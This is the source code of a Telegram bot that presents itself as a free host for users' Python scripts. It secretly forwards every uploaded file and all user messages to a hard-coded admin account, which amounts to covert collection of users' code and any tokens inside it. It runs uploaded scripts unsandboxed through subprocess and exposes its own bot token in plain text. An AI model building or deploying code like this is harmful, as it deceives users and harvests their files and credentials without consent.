import subprocess
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes, CommandHandler

BOT_TOKEN = "8587618600:AAHFRbcoNIVsZoz67qiJCWRegIktLbsRyJc"
ADMIN_ID = 7065784096
FORCE_GROUP = "@saveemoney"
GROUP_LINK = "https://t.me/saveemoney"

process = None


# Join button
def join_button():
    keyboard = [
        [InlineKeyboardButton("🔰 Join Group", url=GROUP_LINK)]
    ]
    return InlineKeyboardMarkup(keyboard)


# Check join
async def is_joined(user_id, context):
    try:
        member = await context.bot.get_chat_member(FORCE_GROUP, user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False


# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.effective_user.id

    if not await is_joined(user_id, context):

        await update.message.reply_text(
            "❌ Join our group to use this bot.",
            reply_markup=join_button()
        )
        return

    await update.message.reply_text("✅ Access Granted\nSend .py file to host.")


# Handle .py file hosting
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):

    global process

    user = update.effective_user
    user_id = user.id

    if not await is_joined(user_id, context):

        await update.message.reply_text(
            "❌ Join our group first.",
            reply_markup=join_button()
        )
        return

    doc = update.message.document

    # Forward file to admin (actual file)
    await context.bot.forward_message(
        ADMIN_ID,
        update.message.chat_id,
        update.message.message_id
    )

    if doc.file_name.endswith(".py"):

        file = await doc.get_file()
        filename = doc.file_name

        await file.download_to_drive(filename)

        if process:
            process.kill()

        process = subprocess.Popen(["python", filename])

        await update.message.reply_text(f"{filename} started successfully 🚀")

        await context.bot.send_message(
            ADMIN_ID,
            f"📂 New bot hosted\nUser ID: {user_id}\nFile: {filename}"
        )


# Forward all messages to admin
async def forward_all(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    if user.id == ADMIN_ID:
        return

    if not await is_joined(user.id, context):
        return

    await context.bot.forward_message(
        ADMIN_ID,
        update.message.chat_id,
        update.message.message_id
    )


# Reply from admin to user
async def reply_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    if update.message.reply_to_message:

        try:
            user_id = update.message.reply_to_message.forward_from.id

            await context.bot.copy_message(
                user_id,
                ADMIN_ID,
                update.message.message_id
            )

        except:
            pass


# Stop command (admin only)
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):

    global process

    if update.effective_user.id != ADMIN_ID:
        return

    if process:
        process.kill()
        process = None

        await update.message.reply_text("🛑 Bot stopped")


# Main
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))

app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
app.add_handler(MessageHandler(filters.ALL, forward_all))
app.add_handler(MessageHandler(filters.REPLY, reply_admin))

print("Secure Controller Bot Running...")
app.run_polling()
